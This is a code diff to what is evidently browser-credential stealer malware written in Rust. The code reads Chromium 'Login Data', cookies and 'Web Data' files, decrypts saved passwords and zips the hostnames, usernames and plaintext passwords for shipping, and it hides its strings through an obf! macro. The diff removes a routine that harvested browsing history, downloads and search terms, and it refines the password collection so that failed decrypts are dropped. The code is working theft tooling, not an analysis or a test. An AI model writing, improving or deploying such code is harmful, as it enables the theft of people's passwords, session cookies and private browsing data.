@@ -199,7 +199,6 @@ fn collect_profile(
     let mut any = false;
     any |= collect_passwords(zip, info, base, &pdir.join(crate::obf!("Login Data")), dec);
     any |= collect_cookies(zip, info, base, pdir, dec);
-    any |= collect_history(zip, info, base, &pdir.join(crate::obf!("History")));
     any |= collect_web_data(zip, info, base, &pdir.join(crate::obf!("Web Data")), dec);
     any
 }
@@ -390,10 +389,14 @@ fn collect_passwords(
         let Some(plain) = dec.decrypt(&enc, false) else {
             continue;
         };
+        let password = String::from_utf8_lossy(&plain).into_owned();
+        if password.is_empty() {
+            continue; // failed/garbage decrypt — never ship empty rows
+        }
         out.push(serde_json::json!({
             "Hostname": url,
             "Username": username,
-            "Password": String::from_utf8_lossy(&plain),
+            "Password": password,
         }));
     }
     info.passwords_count += out.len();
@@ -474,85 +477,6 @@ fn collect_cookies(
         zip.add_file(&format!("{}/Cookies.txt", base), netscape.as_bytes());
     }
     wrote_json
-}
-
-fn collect_history(zip: &mut ZipBuilder, info: &mut Info, base: &str, path: &Path) -> bool {
-    let Some(conn) = open_db_file(path) else {
-        return false;
-    };
-    let mut any = false;
-
-    let urls = conn
-        .prepare(crate::obf!("SELECT url, title, visit_count, last_visit_time FROM urls").as_str())
-        .and_then(|mut stmt| {
-            let rows = stmt
-                .query_map([], |row| {
-                    Ok((
-                        row.get::<_, String>(0)?,
-                        row.get::<_, String>(1)?,
-                        row.get::<_, i64>(2)?,
-                        row.get::<_, i64>(3)?,
-                    ))
-                })?
-                .flatten()
-                .collect::<Vec<_>>();
-            Ok(rows)
-        })
-        .unwrap_or_default();
-    let urls_json: Vec<serde_json::Value> = urls
-        .iter()
-        .map(|(url, title, visits, ts)| {
-            serde_json::json!({
-                "Url": url,
-                "Title": title,
-                "VisitCount": visits,
-                "Timestamp": chrome_time_to_unix(*ts),
-            })
-        })
-        .collect();
-    info.history_count += urls_json.len();
-    any |= put_json(zip, &format!("{}/History.json", base), &urls_json);
-
-    let downloads = conn
-        .prepare(crate::obf!("SELECT target_path, tab_url FROM downloads").as_str())
-        .and_then(|mut stmt| {
-            let rows = stmt
-                .query_map([], |row| {
-                    Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
-                })?
-                .flatten()
-                .collect::<Vec<_>>();
-            Ok(rows)
-        })
-        .unwrap_or_default();
-    let dl_json: Vec<serde_json::Value> = downloads
-        .iter()
-        .map(|(path, url)| {
-            serde_json::json!({
-                "Url": url,
-                "Save": path,
-            })
-        })
-        .collect();
-    any |= put_json(zip, &format!("{}/Downloads.json", base), &dl_json);
-
-    let searches = conn
-        .prepare(crate::obf!("SELECT term FROM keyword_search_terms").as_str())
-        .and_then(|mut stmt| {
-            let rows = stmt
-                .query_map([], |row| row.get::<_, String>(0))?
-                .flatten()
-                .collect::<Vec<_>>();
-            Ok(rows)
-        })
-        .unwrap_or_default();
-    let search_json: Vec<serde_json::Value> = searches
-        .iter()
-        .map(|term| serde_json::json!({ "Text": term }))
-        .collect();
-    any |= put_json(zip, &format!("{}/Searches.json", base), &search_json);
-
-    any
 }
 
 fn collect_web_data(
